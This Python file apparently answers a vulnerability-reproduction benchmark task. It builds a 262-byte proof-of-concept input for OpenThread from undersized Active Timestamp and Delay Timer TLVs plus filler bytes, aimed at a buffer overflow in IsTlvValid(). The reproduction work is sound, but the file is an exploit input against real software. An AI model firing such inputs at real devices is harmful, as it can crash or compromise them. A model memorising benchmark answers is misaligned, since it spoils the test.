import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground truth length is 262 bytes
        # Create a minimal dataset with invalid TLV lengths
        
        # Dataset header (simplified OpenThread Dataset structure)
        # We'll create a single TLV with type 7 (Active Timestamp) 
        # and invalid length that causes overflow
        
        poc = b""
        
        # Dataset TLVs
        # Active Timestamp TLV (type = 7)
        # Invalid length that's too small (less than required 8 bytes)
        # This will cause buffer overflow in IsTlvValid()
        tlv_type = 7  # Active Timestamp
        tlv_length = 1  # Too small - should be at least 8
        
        # Add TLV header
        poc += struct.pack("BB", tlv_type, tlv_length)
        
        # Add minimal value (insufficient for valid timestamp)
        poc += b"A" * tlv_length
        
        # Add more TLVs to reach ground truth length
        # Delay Timer TLV (type = 9) with invalid length
        tlv_type = 9  # Delay Timer
        tlv_length = 1  # Too small - should be at least 4
        poc += struct.pack("BB", tlv_type, tlv_length)
        poc += b"B" * tlv_length
        
        # Pad with additional data to reach exact ground truth length
        remaining = 262 - len(poc)
        if remaining > 0:
            poc += b"C" * remaining
            
        return poc[:262]  # Ensure exact length
